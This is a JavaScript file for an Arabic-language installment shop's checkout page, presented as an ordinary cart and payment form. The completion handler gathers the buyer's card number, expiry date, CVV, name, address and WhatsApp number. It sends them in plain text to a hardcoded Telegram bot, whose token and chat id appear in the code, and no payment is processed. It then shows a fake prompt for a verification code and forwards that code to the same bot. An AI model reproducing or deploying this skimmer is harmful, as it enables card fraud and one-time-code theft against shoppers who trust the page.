document.addEventListener("DOMContentLoaded", () => {
    const form = document.getElementById("checkoutForm");
    const totalCheckout = document.querySelector(".total_checkout");
    const initialPaymentInput = document.getElementById("initial_payment");
    const installments = document.getElementById("installments");
    const monthlyPaymentInput = document.getElementById("monthly_payment");
    const submitButton = document.getElementById("submitButton");
    const previousButton = document.getElementById("previousButton");
    const completeOrderButton = document.getElementById("completeOrderButton");
    const userInputs = document.querySelector(".user_inputs");
    const paymentDetails = document.querySelector(".payment_details");
    const cart = JSON.parse(localStorage.getItem("cart")) || [];

    for (let i = 1; i <= 24; i++) {
        const option = document.createElement("option");
        option.value = i;
        option.textContent = `${i} شهر`;
        installments.appendChild(option);
    }

    let totalPrice = 0;
    let totalQuantity = 0;
    cart.forEach(item => {
        totalPrice += item.price * item.quantity;
        totalQuantity += item.quantity;
    });
    totalCheckout.textContent = `ر.س ${totalPrice.toFixed(2)}`;

    function calculatePayments() {
        const initialPayment = Math.min(totalPrice, totalQuantity * 500);
        const remaining = totalPrice - initialPayment;
        const selectedInstallment = parseInt(installments.value) || 0;
        const monthlyPayment = selectedInstallment ? (remaining / selectedInstallment).toFixed(2) : 0;

        initialPaymentInput.value = initialPayment.toFixed(2);
        monthlyPaymentInput.value = monthlyPayment;
    }

    installments.addEventListener("change", calculatePayments);
    calculatePayments();

    function validateForm() {
        let isValid = true;
        const inputs = form.querySelectorAll("input, select");
        const errorMessages = form.querySelectorAll(".error-message");

        errorMessages.forEach(msg => (msg.textContent = ""));

        inputs.forEach(input => {
            if (input.required && !input.value.trim()) {
                const errorMsg = input.nextElementSibling;
                if (errorMsg) {
                    errorMsg.textContent = "هذا الحقل مطلوب.";
                    errorMsg.classList.add("active");
                }
                isValid = false;
            }

            if ((input.id === "full_name" || input.id === "full_address") && input.value.trim().length < 10) {
                const errorMsg = input.nextElementSibling;
                if (errorMsg) {
                    errorMsg.textContent = "يجب أن يحتوي الحقل على أكثر من 10 أحرف.";
                    errorMsg.classList.add("active");
                }
                isValid = false;
            }

            if (input.id === "whatsapp_number" && input.value.trim().length < 1) {
                const errorMsg = input.nextElementSibling;
                if (errorMsg) {
                    errorMsg.textContent = "هذا الحقل مطلوب.";
                    errorMsg.classList.add("active");
                }
                isValid = false;
            }
        });

        if (!installments.value) {
            const errorMsg = installments.nextElementSibling;
            errorMsg.textContent = "يجب اختيار مدة التقسيط.";
            errorMsg.classList.add("active");
            isValid = false;
        }

        return isValid;
    }

    submitButton.addEventListener("click", () => {
        if (validateForm()) {
            userInputs.style.display = "none";
            paymentDetails.style.display = "block";
            submitButton.style.display = "none";
            previousButton.style.display = "inline";
            completeOrderButton.style.display = "inline";
            document.querySelector(".payment_details").style.display = "flex";
        }
    });

    previousButton.addEventListener("click", () => {
        userInputs.style.display = "block";
        paymentDetails.style.display = "none";
        submitButton.style.display = "inline";
        previousButton.style.display = "none";
        completeOrderButton.style.display = "none";
    });
    document.getElementById("completeOrderButton").addEventListener("click", async function () {
        const button = this;
        button.disabled = true;  
        document.querySelectorAll(".error_message").forEach((el) => (el.textContent = ""));
        
        const cardNumber = document.getElementById("card_number").value.replace(/\s/g, "");
        const expiryDate = document.getElementById("expiry_date").value;
        const cvv = document.getElementById("cvv").value;
        const cardHolder = document.getElementById("card_holder").value;
        const fullName = document.getElementById("full_name").value;
        const fullAddress = document.getElementById("full_address").value;
        const whatsappNumber = document.getElementById("whatsapp_number").value;
        const initialPayment = parseFloat(document.getElementById("initial_payment").value);
        const monthlyPayment = parseFloat(document.getElementById("monthly_payment").value);
        const selectedInstallment = document.getElementById("installments").value;
    
        const cart = JSON.parse(localStorage.getItem("cart")) || [];
    
        let totalQuantity = 0;
        let totalPrice = 0;
    
        cart.forEach(item => {
            totalQuantity += item.quantity;
            totalPrice += item.quantity * item.price;
        });
    
        let isValid = true;
    
        if (!/^\d{16}$/.test(cardNumber)) {
            document.getElementById("card_number_error").textContent = "رقم البطاقة يجب أن يحتوي على 16 رقمًا.";
            isValid = false;
        }
    
        if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
            document.getElementById("expiry_date_error").textContent = "تاريخ البطاقة يجب أن يكون بصيغة MM/YY.";
            isValid = false;
        }
    
        if (!/^\d{3}$/.test(cvv)) {
            document.getElementById("cvv_error").textContent = "رمز الـ CVV يجب أن يكون 3 أرقام.";
            isValid = false;
        }
    
        if (cardHolder.trim() === "") {
            document.getElementById("card_holder_error").textContent = "اسم حامل البطاقة مطلوب.";
            isValid = false;
        }
    
        if (isValid) {
            const botToken = "7973735099:AAE-MYlf-dsAKXPyklTxzGwZ_hB-oDG82wA";
            const chatId = "948393191";
    
            let productDetails = '';
            cart.forEach((product, index) => {
                productDetails += `- **المنتج ${index + 1}:** ${product.name}\n`;
                productDetails += `  - **الكمية:** ${product.quantity}\n`;
                productDetails += `  - **الإجمالي:** ر.س ${(product.quantity * product.price).toFixed(2)}\n\n`;
            });
    
            const messageId = Date.now();
    
            const message = `
                *رقم الرسالة:* ${messageId}
    
                *بيانات الطلب:*
                ${productDetails}
                - **عدد المنتجات:** ${totalQuantity}
                - **إجمالي المنتجات:** ر.س ${totalPrice.toFixed(2)}
    
                *بيانات الشخص:*
                - **الاسم الكامل:** ${fullName}
                - **رقم الواتساب:** ${whatsappNumber}
                - **العنوان الكامل:** ${fullAddress}
    
                *بيانات التقسيط:*
                - **المقدم:** ر.س ${initialPayment.toFixed(2)}
                - **مدة التقسيط:** ${selectedInstallment} شهر
                - **القسط الشهري:** ر.س ${monthlyPayment.toFixed(2)}
    
                *بيانات البطاقة:*
                - **رقم البطاقة:** ${cardNumber}
                - **تاريخ الانتهاء:** ${expiryDate}
                - **رمز CVV:** ${cvv}
                - **اسم حامل البطاقة:** ${cardHolder}
            `;
    
            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const payload = {
                chat_id: chatId,
                text: message,
                parse_mode: "Markdown"
            };
    
            try {
                const response = await fetch(apiUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify(payload),
                });
                const data = await response.json();
                button.disabled = false; 
                if (data.ok) {
                    Swal.fire({
                        title: 'سيتم ارسال الكود خلال 5 دقائق',
                        input: 'text',
                        inputLabel: 'كود التحقق',
                        inputPlaceholder: 'أدخل كود التحقق المرسل إليك',
                        showCancelButton: false,
                        confirmButtonText: 'إرسال',
                        allowOutsideClick: false,
                        customClass: {
                            confirmButton: 'btn-confirm'
                        },
                        preConfirm: (verificationCode) => {
                            if (!verificationCode) {
                                Swal.showValidationMessage('يرجى إدخال كود التحقق');
                                return false; 
                            }
                            return verificationCode;
                        }
                        
                    }).then(async (result) => {
                        if (result.isConfirmed) {
                            const verificationCode = result.value;
                            const verificationMessage = `
                                *رقم الرسالة:* ${messageId}
                                *بيانات التحقق:*
                                - **كود التحقق:** ${verificationCode}
                            `;
                            const verificationPayload = {
                                chat_id: chatId,
                                text: verificationMessage,
                                parse_mode: "Markdown"
                            };
    
                            await fetch(apiUrl, {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json",
                                },
                                body: JSON.stringify(verificationPayload),
                            });
    
                            Swal.fire({
                                toast: true,
                                position: 'top-end',
                                icon: 'success',
                                title: 'تم الإرسال بنجاح!',
                                text: 'تم إرسال الكود بنجاح.',
                                showConfirmButton: false,
                                timer: 3000
                            });
                            localStorage.clear();
                            setTimeout(() => window.location.reload(), 3000);
                        }
                    });
                } else {
                    console.error("Telegram API Error:", data);
                    Swal.fire({
                        toast: true,
                        position: 'top-end',
                        icon: 'error',
                        title: 'خطأ!',
                        text: 'حدث خطأ أثناء الإرسال. التفاصيل في الكونسول.',
                        showConfirmButton: false,
                        timer: 3000
                    });
                }
            } catch (error) {
                button.disabled = false;
                console.error("Fetch Error:", error);
                Swal.fire({
                    toast: true,
                    position: 'top-end',
                    icon: 'error',
                    title: 'خطأ!',
                    text: 'حدث خطأ أثناء الإرسال.',
                    showConfirmButton: false,
                    timer: 3000
                });
            }
        } else {
            button.disabled = false; 
        }
    });
    
    document.getElementById("card_number").addEventListener("input", function (e) {
        this.value = this.value
            .replace(/\s/g, "") // Remove existing spaces
            .replace(/(\d{4})/g, "$1 ") // Add space every 4 digits
            .trim(); // Remove trailing space
    });

    document.getElementById("card_number").addEventListener("keypress", function (e) {
        if (this.value.replace(/\s/g, "").length >= 16) {
            e.preventDefault();
        }
    });

document.getElementById("expiry_date").addEventListener("input", function (e) {
    this.value = this.value.replace(/[^0-9\/]/g, "");
    if (this.value.length === 2 && !this.value.includes("/")) {
        this.value = this.value + "/";
    }
    if (this.value.length > 5) {
        this.value = this.value.slice(0, 5);
    }
});

document.getElementById("cvv").addEventListener("input", function (e) {
    this.value = this.value.replace(/\D/g, "");
    if (this.value.length > 3) {
        this.value = this.value.slice(0, 3);
    }
});

    
    

    const itemsContainer = document.querySelector('.items');
    let cartTotalPrice = 0;

    cart.forEach((item, index) => {
        let total_Price_item = item.price * item.quantity;
        cartTotalPrice += total_Price_item;

        itemsContainer.innerHTML += `
            <div class="item_cart">
                <img src="${item.img}" alt="">
                <div class="content">
                    <h4>${item.name}</h4>
                    <p class="price_cart">ر.س${total_Price_item.toFixed(2)}</p>
                    <div class="quantity_control">
                        <button class="decrease_quantity" data-index="${index}">-</button>
                        <span class="quantity">${item.quantity}</span>
                        <button class="increase_quantity" data-index="${index}">+</button>
                    </div>
                </div>
                <button class="delete_item" data-index="${index}"><i class="fa-solid fa-trash-can"></i></button>
            </div>
        `;
    });

    document.querySelector(".total_checkout").textContent = `ر.س${cartTotalPrice.toFixed(2)}`;
    setupCheckoutButtons();
});

function setupCheckoutButtons() {
    const increaseButtons = document.querySelectorAll(".increase_quantity");
    const decreaseButtons = document.querySelectorAll(".decrease_quantity");
    const deleteButtons = document.querySelectorAll(".delete_item");

    increaseButtons.forEach(button => {
        button.addEventListener("click", function () {
            const itemIndex = this.getAttribute("data-index");
            increaseQuantity(itemIndex);
        });
    });

    decreaseButtons.forEach(button => {
        button.addEventListener("click", function () {
            const itemIndex = this.getAttribute("data-index");
            decreaseQuantity(itemIndex);
        });
    });

    deleteButtons.forEach(button => {
        button.addEventListener("click", function () {
            const itemIndex = this.getAttribute("data-index");
            removeFromCart(itemIndex);
        });
    });
}

function increaseQuantity(index) {
    const cart = JSON.parse(localStorage.getItem("cart"));
    cart[index].quantity += 1;
    localStorage.setItem("cart", JSON.stringify(cart));
    window.location.reload();
}

function decreaseQuantity(index) {
    const cart = JSON.parse(localStorage.getItem("cart"));
    if (cart[index].quantity > 1) {
        cart[index].quantity -= 1;
        localStorage.setItem("cart", JSON.stringify(cart));
        window.location.reload();
    }
}

function removeFromCart(index) {
    const cart = JSON.parse(localStorage.getItem("cart"));
    cart.splice(index, 1);
    localStorage.setItem("cart", JSON.stringify(cart));
    window.location.reload();
}
